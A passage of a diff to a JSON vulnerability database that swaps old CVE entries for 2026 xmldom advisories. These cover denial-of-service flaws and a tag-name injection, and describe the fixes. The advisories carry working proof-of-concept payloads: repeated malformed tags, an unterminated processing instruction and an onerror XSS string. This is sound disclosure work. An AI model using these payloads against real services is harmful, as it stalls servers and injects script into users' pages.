+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5488",
+        "http://www.osvdb.org/442"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0861",
-      "summary": "Race condition in the SSL ISAPI filter in IIS and other servers may leak information in plaintext.",
-      "cvssScore": 2.6,
-      "severity": "Low",
-      "published": "1999-08-11",
-      "modified": null,
-      "cwe": "CWE-362",
-      "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ244613",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-053",
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ244613",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-053"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0867",
-      "summary": "Denial of service in IIS 4.0 via a flood of HTTP requests with malformed headers.",
+      "id": "CVE-2000-1048",
+      "summary": "Directory traversal vulnerability in the logfile service of Wingate 4.1 Beta A and earlier allows remote attackers to read arbitrary files via a .. (dot dot) attack via an HTTP GET request that uses encoded characters in the URL.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "1999-08-11",
+      "published": "2000-12-11",
       "modified": null,
-      "cwe": "CWE-20",
+      "cwe": null,
       "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238349",
-        "http://www.ciac.org/ciac/bulletins/j-058.shtml",
-        "http://www.securityfocus.com/bid/579",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1999/ms99-029",
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ238349"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0245.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5373",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-10/0245.html",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5373"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0875",
-      "summary": "DHCP clients with ICMP Router Discovery Protocol (IRDP) enabled allow remote attackers to modify their default routes.",
-      "cvssScore": 7.5,
+      "id": "CVE-2000-1049",
+      "summary": "Allaire JRun 3.0 http servlet server allows remote attackers to cause a denial of service via a URL that contains a long string of \".\" characters.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-12-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=97310314724964&w=2",
+        "http://www.allaire.com/handlers/index.cfm?ID=18085&Method=Full",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5452",
+        "http://marc.info/?l=bugtraq&m=97310314724964&w=2",
+        "http://www.allaire.com/handlers/index.cfm?ID=18085&Method=Full"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-83614",
+      "summary": "## Summary\n\n`xmldom`'s malformed-input **error-recovery path** has two quadratic-time (O(n²)) behaviors that a\nsingle crafted input triggers together, so a tiny, highly compressible document (tens of KB) stalls\nthe Node.js event loop for multiple seconds. It is reachable from `DOMParser.parseFromString` under\n**default options** — i.e. from unauthenticated, network-delivered XML — making this an unauthenticated\ndenial of service. One of the two behaviors, the `normalize()` adjacent-text merge, is **additionally\nreachable programmatically** — via a plain `normalize()` call on a DOM built with adjacent text nodes,\nindependent of the parser — so its fix must live in `normalize()`, not only in a parser bound.\n\n## Details\n\n### Finding A — `parseElementStartPart` quadratic re-scan\n\nA `<` character is not a delimiter in any tag-parsing state, so `parseElementStartPart` scans\nforward character-by-character over any embedded `<` until it reaches the next `>` (or end of\ninput), then validates the accumulated slice as a tag name and throws `invalid tagName:` on failure.\nThe main loop catches this, reports an `error`, sets `end = -1`, and recovers by advancing a single\ncharacter (`appendText(Math.max(tagStart, start) + 1)`). With a long run of `<` and a distant `>`,\neach of the O(n) recovery retries performs an O(n) scan plus an O(n) anchored regex validation over\nthe growing candidate ⇒ **O(n²)**.\n\nCode (0.9.x, `bb7a085dc5ba1eea3212388509b97bb4b4af32b9`):\n\n- `parseElementStartPart` character scan — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L263-L461\n- tag-name validation (`setTagName` → throws `invalid tagName`) — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L886-L891\n- main-loop `catch` → `error` + `end = -1` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L234-L242\n- single-character recovery fallback — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L247\n\nCode (0.8.x, `e5c14802592685bb872c042c54c3f73758875c85`):\n\n- `parseElementStartPart` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L227\n- `catch` → `error` + `end = -1` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L202-L208\n- recovery fallback — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L213\n- `setTagName` validation ��� https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/sax.js#L616-L621\n\n### Finding B — `normalize()` adjacent-text O(K²) merge\n\n`endDocument()` calls `document.normalize()`. For a parent with K adjacent text nodes (produced by\nthe one-character recovery of Finding A), `normalize()` performs K−1 merges. Each merge does a\n`removeChild` — which re-indexes **all** child nodes of the parent (O(K)) — and an `appendData` —\nwhich rebuilds the accumulator string `this.data + text` (O(K)). Total: **O(K²)**.\n\nWell-formed XML cannot produce adjacent text-node siblings *through the parser* (each text run is one\nnode; comments, CDATA, PIs, and elements sit between runs), so the **parse-path** trigger for Finding B\nis the malformed-input recovery that emits single-character text nodes. The same O(K²) merge is,\nhowever, independently reachable via the public `normalize()` API on a programmatically built tree\n(see \"Finding B is additionally reachable programmatically\" below).\n\nCode (0.9.x, `bb7a085dc5ba1eea3212388509b97bb4b4af32b9`):\n\n- `endDocument` → `normalize()` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom-parser.js#L418-L420\n- `normalize()` adjacent-text merge — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L1336-L1356\n- `removeChild` re-index-all branch — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L1788-L1798\n- `appendData` string rebuild — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/dom.js#L2786-L2790\n\nCode (0.8.x, `e5c14802592685bb872c042c54c3f73758875c85`):\n\n- `endDocument` → `normalize()` — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom-parser.js#L213-L214\n- `normalize()` merge — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L529-L549\n- `removeChild` re-index-all branch — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L756-L773\n- `appendData` string rebuild — https://github.com/xmldom/xmldom/blob/e5c14802592685bb872c042c54c3f73758875c85/lib/dom.js#L1533\n\n### Finding B is additionally reachable programmatically (no parser involved)\n\n`Node.prototype.normalize()` is public API on every `Document`/`Element`. A tree built entirely through\nthe ordinary DOM API — `new DOMImplementation().createDocument(...)`, then K× `createTextNode` +\n`appendChild` on one parent — reaches the **same** O(K²) merge when the application calls `normalize()`,\nwith **no** parsing and **no** error-recovery. The parser is only *one* of the two callers of the\nvulnerable merge:\n\n- the parser's automatic `endDocument()` → `document.normalize()` (the parse-path trigger above), and\n- any explicit application call to the public `normalize()` on a tree with adjacent text nodes.\n\n`XMLSerializer` does **not** call `normalize()`, so serializing an un-merged tree is O(total text), not\nO(K²); the O(K²) surface is exactly those two `normalize()` callers. Consequently a parser-side bound\nalone cannot remediate Finding B — the fix must live in `normalize()`.\n\n## Affected Versions\n\nBoth findings are present across the full published `@xmldom/xmldom` history — both\ncurrently-maintained versions (`0.8.x` and `0.9.x`) are affected — and across the retired unscoped\n`xmldom` line. Finding B's `normalize()` merge is additionally reachable **programmatically**: a\ndirect `normalize()` call on a DOM built with adjacent text nodes hits the same O(K²) merge,\nindependent of the parser — so, unlike Finding A, it does not require the malformed-input recovery\npath.\n\n## Proof of Concept\n\nDefault `DOMParser`, no options. The input is trivially compressible (`a<` / `a<>` repeated) and\nnever throws — it is parsed via the recovery path.\n\n```js\nconst { DOMParser } = require('@xmldom/xmldom');\n\n// Silence the expected `error`-level recovery reports (default handler logs\n// them to console.error without throwing; only fatalError throws).\nconsole.error = function () {};\n\nfunction timeParse(label, xml, mime) {\n  const t0 = process.hrtime.bigint();\n  new DOMParser().parseFromString(xml, mime); // completes; no exception\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6;\n  console.log(label + '  bytes=' + Buffer.byteLength(xml) + '  time=' + ms.toFixed(1) + ' ms');\n}\n\nfor (const N of [4000, 8000, 16000, 32000]) {\n  // Finding A: long re-scans, O(n^2) during parse.\n  timeParse('A N=' + N, '<r>' + 'a<'.repeat(N) + '</r>', 'text/xml');\n  // Finding B: short re-scans (cheap parse) but K adjacent text nodes -> O(K^2) in normalize().\n  timeParse('B N=' + N, '<r>' + 'a<>'.repeat(N) + '</r>', 'text/html');\n  // Combined: ONE input hits both A and B under the default parser.\n  timeParse('C N=' + N, '<r>' + 'a<'.repeat(N) + '</r>', 'text/xml');\n}\n```\n\nMeasured on Node v18.20.8 (absolute ms vary by host; the load-bearing fact is that doubling the\ninput ~quadruples the time — canonical O(n²)):\n\nFinding A, isolated (`\"<r>\" + \"a<\"×N + \"</r>\"`, normalize disabled to isolate the re-scan):\n\n| N | input bytes | `@xmldom/xmldom` 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 2000 | 4007 | 43 ms | 37 ms |\n| 4000 | 8007 | 129 ms | 106 ms |\n| 8000 | 16007 | 434 ms | 424 ms |\n| 16000 | 32007 | 1629 ms | 1611 ms |\n\nFinding B, isolated (`\"<r>\" + \"a<>\"×N + \"</r>\"`, time attributable to `normalize()`):\n\n| K (N) | input bytes | 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 4000 | 12007 | 120 ms | 165 ms |\n| 8000 | 24007 | 589 ms | 771 ms |\n| 16000 | 48007 | 3142 ms | 4448 ms |\n| 32000 | 96007 | 12127 ms | 12951 ms |\n\nCombined (default parser, both findings; `\"<r>\" + \"a<\"×N + \"</r>\"`):\n\n| N | input bytes | 0.9.10 | 0.8.13 |\n|--:|--:|--:|--:|\n| 4000 | 8007 | 341 ms | 397 ms |\n| 8000 | 16007 | 1894 ms | 1641 ms |\n| 16000 | 32007 | 4398 ms | 7661 ms |\n\n~32 KB of input → several seconds of single-threaded event-loop stall.\n\n### Finding B via the public `normalize()` API (no parser)\n\n```js\nconst { DOMImplementation } = require('@xmldom/xmldom');\n\nfunction timeNormalize(K) {\n  const doc = new DOMImplementation().createDocument(null, 'r', null);\n  const el = doc.documentElement;\n  for (let i = 0; i < K; i++) el.appendChild(doc.createTextNode('x')); // K adjacent text nodes\n  const t0 = process.hrtime.bigint();\n  doc.normalize();                                    // O(K^2) merge — no parsing involved\n  const ms = Number(process.hrtime.bigint() - t0) / 1e6;\n  console.log('K=' + K + '  time=' + ms.toFixed(1) + ' ms');\n}\nfor (const K of [2000, 4000, 8000, 16000, 32000]) timeNormalize(K);\n```\n\nMeasured on Node v18.20.8 (doubling K ~quadruples the time — O(K²)):\n\n| K | 0.9.10 | 0.8.13 |\n|--:|--:|--:|\n| 2000 | 5.7 ms | 5.6 ms |\n| 32000 | 1263 ms | 1704 ms |\n\nThis path is reachable by any application that builds a DOM from attacker-influenced data and calls\n`normalize()`, entirely independent of `DOMParser`.\n\n## Impact\n\nAvailability only: a single parse of a small crafted document blocks the Node.js event loop for the\nduration of the quadratic work (multiple seconds at tens of KB; larger inputs scale as O(n²)). No\nmemory blow-up beyond transient strings, no data exposure, no integrity impact. Because XML is\nroutinely accepted from untrusted sources and parsed with default options, one request can stall a\nserver. The payloads are highly compressible, so any endpoint accepting compressed XML faces\nadditional amplification. Finding B is additionally reachable via an explicit `normalize()` call on a\nprogrammatically built DOM (see Proof of Concept), so applications that construct a document from attacker-influenced\ndata and normalize it are exposed even without parsing.\n\n## Severity note\n\nThe complexity is **quadratic**, not exponential, so a multi-second stall requires\ntens-to-hundreds of KB of input. `VA:H` reflects that xmldom applies **no** input-size limit and the\npath runs on default-options parsing, so a single unbounded parse can fully stall the event loop.\n\n## Fix Applied\n\nTwo independent, non-breaking fixes shipped together — each alone leaves the other's quadratic cost dominating the default parse.\nFinding A — terminate the malformed tag-name scan at an embedded `<`, so error recovery is linear instead of O(n²). DOM output is unchanged; only the reported error-message text differs (error strings are not a semver contract).\nFinding B — merge adjacent text nodes in `normalize()` in O(K) instead of O(K²), which also closes the same slowdown reachable programmatically through a direct `normalize()` call. Both ship on both maintained versions.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1999-08-11",
-      "modified": null,
-      "cwe": "CWE-16",
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
       "references": [
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ216141",
-        "http://www.securityfocus.com/bid/578",
-        "http://support.microsoft.com/default.aspx?scid=kb%3B%5BLN%5D%3BQ216141",
-        "http://www.securityfocus.com/bid/578"
+        "https://github.com/xmldom/xmldom/security/advisories/GHSA-93r5-fhx6-vmg9",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-83614",
+        "https://github.com/xmldom/xmldom/pull/1071",
+        "https://github.com/xmldom/xmldom/pull/1072",
+        "https://github.com/xmldom/xmldom/commit/0748720b620555f8c222782dcab575cf0cf403b4"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@xmldom/xmldom npm",
+        "xmldom npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0724",
-      "summary": "Buffer overflow in OpenBSD procfs and fdescfs file systems via uio_offset in the readdir() function.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1999-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.osvdb.org/6128",
-        "http://www.osvdb.org/6128"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1336",
-      "summary": "3Com HiPer Access Router Card (HiperARC) 4.0 through 4.2.29 allows remote attackers to cause a denial of service (reboot) via a flood of IAC packets to the telnet port.",
-      "cvssScore": 5,
-      "severity": "Medium",
-      "published": "1999-08-12",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=93458364903256&w=2",
-        "http://marc.info/?l=bugtraq&m=93492615408725&w=2",
-        "http://www.osvdb.org/6057",
-        "http://marc.info/?l=bugtraq&m=93458364903256&w=2",
-        "http://marc.info/?l=bugtraq&m=93492615408725&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0109",
-      "summary": "Buffer overflow in ffbconfig in Solaris 2.5.1.",
-      "cvssScore": 7.2,
+      "id": "CVE-2026-83612",
+      "summary": "## Summary\n\nIn HTML mode (`text/html`), a raw-text element (`script`, `style`, `textarea`, `title`) whose closing\ntag differs in case from its opening tag (e.g. `</ScRiPt>` for `<script>`) is mishandled by the\nparser, producing quadratic (O(n²)) output growth — a small crafted document parses and serializes\ninto output orders of magnitude larger, exhausting CPU and memory. A modest input of tens of KB can\ntherefore cause a denial of service in any service that parses untrusted HTML with xmldom. Only HTML\nmode is affected.\n\n## Details\n\nThe parser calls `parseHtmlSpecialContent` for each raw-text element in HTML mode, matched via\n`isHTMLRawTextElement` / `isHTMLEscapableRawTextElement` (so all four types — `script`, `style`,\n`textarea`, `title` — are in scope). It searches for the element's closing tag with\n`source.indexOf('</' + tagName + '>', elStartEnd)`, a byte-for-byte case-sensitive match. A\nmixed-case closing tag never matches, so the search returns `-1`, and the following\n`source.substring(elStartEnd + 1, -1)` extracts text backwards from the start of the document\ninstead of the element's content. The function then returns `-1` to the parse loop, which cannot\nadvance normally and falls back to character-by-character reprocessing. Every raw-text element\nre-captures all source text preceding it, so output grows as O(n²) in the number of such elements.\n\n### Root Cause\n\n1. **Case-sensitive close-tag search** (`lib/sax.js:549`): `source.indexOf('</' + tagName + '>',\n   elStartEnd)` does not fold case, contrary to the WHATWG HTML RAWTEXT end-tag-name rule.\n2. **Unguarded `-1`** (`lib/sax.js:550`): `source.substring(elStartEnd + 1, elEndStart)` runs even\n   when `elEndStart === -1`, extracting text backwards from position 0.\n3. **Unstable progression** (`lib/sax.js:556`): the function returns `elEndStart` (`-1`), driving\n   repeated character-by-character fallback in the parse loop.\n\n## Affected Versions\n\nOnly the `0.9.x` line is affected — the amplification was introduced in `0.9.0-beta.1` when\n`parseHtmlSpecialContent` was refactored, and remains through `0.9.11`. The `0.8.x` line is **not**\naffected: its older `parseHtmlSpecialContent` does not amplify, despite sharing the same\ncase-sensitive `indexOf`.\n\n## Proof of Concept\n\n```js\nconst { DOMParser, XMLSerializer } = require('@xmldom/xmldom');\n\nconst n = 1000;\nconst payload = '<html><body>' + '<script>x</ScRiPt>'.repeat(n) + '</body></html>';\nconst doc = new DOMParser().parseFromString(payload, 'text/html');\nconst out = new XMLSerializer().serializeToString(doc);\nconsole.log(payload.length, out.length, (out.length / payload.length).toFixed(1) + 'x');\n// 18026 9037063 501.3x  — an 18 KB input yields ~9 MB of output\n```\n\nOutput size grows quadratically with the number of case-mismatched raw-text elements:\n\n```\nRepeats | Input len | Output len | Ratio\n1       | 44        | 109        | 2.5x\n100     | 1826      | 93763      | 51.3x\n500     | 9026      | 2268563    | 251.3x\n1000    | 18026     | 9037063    | 501.3x\n2000    | 36026     | 36074063   | 1001.3x\n```\n\nProof of Concept from @KarimTantawey (tested with `script`); the same amplification occurs for `style`,\n`textarea`, and `title`.\n\n## Impact\n\nSmall attacker payloads can force disproportionate CPU and memory usage in services that\nparse and serialize untrusted HTML via xmldom. The quadratic growth means a modest-sized input\n(tens of kilobytes) can produce output in the tens or hundreds of megabytes, potentially\nexhausting memory or causing timeouts.\n\nThe attack only requires HTML mode (`text/html` MIME type) and mixed-case closing tags for\nany of the four raw-text element types. No special configuration or error handler setup is needed.\n\n## Severity note\n\nThe CVSS 4.0 vector scores availability only (`VA:H`, with `VC:N/VI:N`): the flaw neither discloses\nnor corrupts data, but a small untrusted HTML input (tens of KB) can force output and memory in the\ntens to hundreds of MB, enough to exhaust a service's heap or stall its event loop. It is reachable\nwith no authentication, configuration, or error-handler setup — only that the application parses\nuntrusted `text/html` and serializes the result.\n\n## Fix Applied\n\nThe raw-text closing tag is now matched case-insensitively in HTML raw-text mode (per the WHATWG HTML\n[RAWTEXT end-tag rule](https://html.spec.whatwg.org/multipage/parsing.html#rawtext-end-tag-name-state)),\nand a missing closing tag is handled explicitly, removing the quadratic output amplification. Output\nfor well-formed input is unchanged. Non-breaking; 0.9.x-only.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1997-02-10",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-178",
+        "name": "Improper Handling of Case Sensitivity"
+      },
       "references": [
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/140",
-        "http://sunsolve.sun.com/pub-cgi/retrieve.pl?doctype=coll&doc=secbull/140"
+        "https://github.com/xmldom/xmldom/security/advisories/GHSA-6mj3-qw4j-hgrw",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-83612",
+        "https://github.com/xmldom/xmldom/pull/1071",
+        "https://github.com/xmldom/xmldom/commit/7ced40c06c28d151e996a97045018c3559ae4707",
+        "https://github.com/xmldom/xmldom/releases/tag/0.9.12"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@xmldom/xmldom npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0868",
-      "summary": "ucbmail allows remote attackers to execute commands via shell metacharacters that are passed to it from INN.",
-      "cvssScore": 7.2,
+      "id": "CVE-2026-83606",
+      "summary": "## Summary\n\n`@xmldom/xmldom`'s processing-instruction (PI) grammar regex exhibits quadratic-time backtracking\n(ReDoS) when parsing an **unterminated** processing instruction. A single small XML document\ncontaining `<?` + a target + a long run of whitespace and no closing `?>` forces the regular\nexpression engine into O(n²) work, stalling the Node.js event loop. The input is parsed with\n`DOMParser.parseFromString` under **default options**, so it is reachable from unauthenticated,\nnetwork-delivered XML (SOAP/SAML, webhooks, uploads, XML APIs).\n\n## Details\n\nThe PI production in `lib/grammar.js` compiles (flags `mu`) to:\n\n```\n^<\\?(NameChars)(?:[\\x20\\x09\\x0D\\x0A]+([Char]*?))?\\?>\n                     ^^^ S+ greedy       ^^^ Char*? lazy\n```\n\n- `lib/grammar.js` line 261: https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/grammar.js#L261\n\nIn the optional tail `(?:S+(Char*?))?`, both the greedy separator `S+` and the lazy data `Char*?`\nmatch XML whitespace. When the required trailing `?>` is absent, the engine must ultimately fail —\nbut first it tries every partition of the whitespace run between `S+` and `Char*?`, which is O(n²)\nin the length of the trailing whitespace.\n\nThe regex is executed against the **entire remaining source string** in two places in `lib/sax.js`,\nso the whole whitespace tail is scanned:\n\n- `parsePI` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L680-L691\n- `parseProcessingInstruction` — https://github.com/xmldom/xmldom/blob/bb7a085dc5ba1eea3212388509b97bb4b4af32b9/lib/sax.js#L862-L879\n\n## Affected Versions\n\nOnly the `0.9.x` line is affected. `lib/grammar.js` (and this PI regex) was introduced in\ncommit `726b471` (\"fix!: preserve DOCTYPE internal subset (#498)\"), first released in\n**0.9.0-beta.9**, and is unchanged through **0.9.10**.\n\nThe `0.8.x` line (≤ 0.8.13) and the unscoped `xmldom` package (≤ 0.6.0) parse PIs via a different\ncode path bounded by `indexOf('?>')` — they do **not** contain this regex and are **not affected**\nby this issue. (They were not separately tested for a *different* PI ReDoS; the scope here is the\nspecific `grammar.js` regex.)\n\n| Line | PI code path | Affected? |\n|---|---|---|\n| `0.9.x` (0.9.0-beta.9 … 0.9.10) | `grammar.js` `PI` regex over full remaining source | **Yes** |\n| `0.8.x` (≤ 0.8.13) | `parseInstruction`, bounded by `indexOf('?>')` | No |\n| unscoped `xmldom` (≤ 0.6.0) | older `indexOf('?>')`-bounded parsing | No |\n\n## Proof of Concept\n\n```js\nconst { DOMParser } = require('@xmldom/xmldom');\nconst n = 32 * 1024;\nconst payload = '<a><?p' + ' '.repeat(n); // unterminated PI, no `?>`\nconsole.time('parse');\nnew DOMParser().parseFromString(payload, 'text/xml');\nconsole.timeEnd('parse');\n```\n\nMeasured (Node 18), trailing whitespace after `<?p`, no `?>` — time quadruples per doubling of\ninput length (canonical O(n²)):\n\n| Trailing whitespace | `g.PI.exec` | `parseFromString` |\n|---|---|---|\n| 2 KB  | 4.4 ms    | 5.1 ms   |\n| 4 KB  | 16.9 ms   | 17.0 ms  |\n| 8 KB  | 111.4 ms  | 66.3 ms  |\n| 16 KB | 263.8 ms  | 336.5 ms |\n| 32 KB | 1073.1 ms | —        |\n\n## Impact\n\nAvailability only: a single parse of a small crafted document blocks the Node.js event loop for the\nduration of the quadratic scan (≈1 s at 32 KB; multi-second with larger inputs). No memory blow-up,\nno data exposure, no integrity impact. Because XML is routinely accepted from untrusted sources and\nparsed with default options, one request can stall a server.\n\n## Fix Applied\n\nFixed in `@xmldom/xmldom` **0.9.11** (`0.9.x`-only; the `0.8.x` LTS line and the\nunscoped `xmldom` package use a different, bounded PI code path and are not affected).\n\nPR [#1039](https://github.com/xmldom/xmldom/pull/1039) inserts a fixed-width negative lookahead\n`(?!\\s)` immediately after the greedy `S+`, so the separator can no longer hand whitespace back to\nthe lazy data group:\n\n```\n- var PI = reg(/^<\\?/, '(', Name, ')', regg(S, '(', Char, '*?)'), '?', /\\?>/);\n+ var PI = reg(/^<\\?/, '(', Name, ')', regg(S, '(?!', _SChar, ')(', Char, '*?)'), '?', /\\?>/);\n```\n\nThe change is correct, minimal, and behavior-preserving: it produces identical `[target, data]`\ncaptures on all valid PIs tested (incl. whitespace-heavy, tab/newline, empty-data, and xml-decl\ncases) and removes the backtracking blow-up (linear, ~0.4 ms at 128 KB after the fix). The lookahead\nis fixed-width and cannot itself backtrack — a strict improvement with no new parsing risk.\n\n## Severity note\n\nThe complexity is **quadratic**, not exponential, so a multi-second stall requires\ntens-to-hundreds of KB of input. `VA:H` reflects that xmldom applies **no input-size limit** and the\npath runs on default-options parsing, so a single unbounded parse can fully stall the event loop.",
+      "cvssScore": 8.7,
       "severity": "High",
-      "published": "1997-02-20",
-      "modified": null,
-      "cwe": null,
+      "published": "2026-09-08",
+      "modified": "2026-09-08",
+      "cwe": {
+        "cwe_id": "CWE-400",
+        "name": "Uncontrolled Resource Consumption"
+      },
       "references": [
-        "https://www.cs.ait.ac.th/joomla3/index.php/security-advisories?CERT/CA97/msg00027.shtml",
-        "https://www.cs.ait.ac.th/joomla3/index.php/security-advisories?CERT/CA97/msg00027.shtml"
+        "https://github.com/xmldom/xmldom/security/advisories/GHSA-g53g-w8rj-fmg7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-83606",
+        "https://github.com/xmldom/xmldom/pull/1039",
+        "https://github.com/xmldom/xmldom/commit/73df6b8bdbd86f904b9e8c3ab9c49aa54ef2802e",
+        "https://github.com/xmldom/xmldom/releases/tag/0.9.11"
       ],
-      "vulnerableProducts": [],
+      "vulnerableProducts": [
+        "@xmldom/xmldom npm"
+      ],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0318",
-      "summary": "Buffer overflow in xmcd 2.0p12 allows local users to gain access through an environmental variable.",
-      "cvssScore": 7.2,
+      "id": "CVE-2026-83607",
+      "summary": "## Summary\n\n`Document.createElement()` in `@xmldom/xmldom` accepts arbitrary strings as the `tagName` parameter with zero validation. The serializer emits the tag name verbatim into XML/HTML output. Critically, the `requireWellFormed: true` serializer option — the recommended mitigation from CVE-2026-41672, CVE-2026-41674, and CVE-2026-34601 — did NOT catch this, making it a bypass of the existing security controls.\n\nAn attacker who controls the element name string can inject arbitrary attributes (including event handlers) into the serialized output, leading to XSS when the output is consumed by a browser or downstream parser.\n\n## Details\n\n`Document.createElement()` accepts any string as `tagName` and stores it directly on the element node without validation. When the document is later serialized via `XMLSerializer.serializeToString()`, the serializer emits the `tagName` verbatim into the output.\n\nThe XML specification requires element names to conform to the `Name` production. The existing `createAttributeNS()` and `createElementNS()` methods validate qualified names against an anchored name/`QName` pattern, but `createElement()` bypasses this entirely, and the `requireWellFormed: true` serializer path performed no element-name validation — rendering it ineffective against this vector.\n\n### Root Cause\n\n1. `createElement()` stores the raw `tagName` string without any validation.\n2. The serializer's `requireWellFormed` code path did not validate element names against the XML `Name`/`QName` production.\n3. The serializer emits `tagName` directly into angle brackets: `<${tagName}...>`.\n\n## Proof of Concept\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst impl = new DOMImplementation();\nconst serializer = new XMLSerializer();\nconst doc = impl.createDocument(null, 'root', null);\n\n// Inject an element whose \"name\" contains attributes with an XSS payload\nconst el = doc.createElement('img src=x onerror=\"alert(1)\"');\ndoc.documentElement.appendChild(el);\n\nconst output = serializer.serializeToString(doc, { requireWellFormed: true });\nconsole.log(output);\n// <root><img src=x onerror=\"alert(1)\"/></root>\n//\n// A browser parsing this HTML will execute alert(1).\n// requireWellFormed: true did NOT prevent the injection.\n```\n\n## Impact\n\nApplications that use `@xmldom/xmldom` to construct DOM trees and serialize them to XML/HTML are vulnerable to injection attacks if any part of an element name originates from user input. This includes:\n\n- **Cross-Site Scripting (XSS)**: Injecting event handler attributes (`onerror`, `onclick`, etc.) into HTML output consumed by browsers.\n- **XML injection**: Breaking XML document structure by injecting closing tags, new elements, or processing instructions through the element name.\n- **Security control bypass**: Applications that adopted `requireWellFormed: true` as a mitigation for CVE-2026-41672 / 41674 / 34601 remained vulnerable through this vector.\n\n`@xmldom/xmldom` can also be used inside browsers, where it mirrors the DOM API. Unlike the browser's `createElement()`, which rejects an invalid name with `InvalidCharacterError`, xmldom accepts it — developers may assume the same safety and skip validation.\n\n## Fix Applied\n\n> **⚠ Opt-in required.** Protection is not automatic. Existing serialization calls remain\n> vulnerable unless `{ requireWellFormed: true }` is explicitly passed. Applications that\n> serialize untrusted DOM content should audit all `serializeToString()` call sites and add it.\n\nWhen `{ requireWellFormed: true }` is passed, the serializer now validates each element's serialized qualified name against the XML `QName` production and throws `InvalidStateError` before emitting the start tag. This also covers the **namespace-prefix** sub-vector: an invalid prefix surfaces either in the element qualified name (`PREFIX:local`) or in a synthesized `xmlns:PREFIX` declaration, and both are QName-checked.\n\nFixed under `requireWellFormed: true` in `@xmldom/xmldom` **0.9.11** and **0.8.14**. Default serialization is unchanged.\n\n### PoC — fixed path\n\n```js\nconst { DOMImplementation, XMLSerializer } = require('@xmldom/xmldom');\n\nconst doc = new DOMImplementation().createDocument(null, 'root', 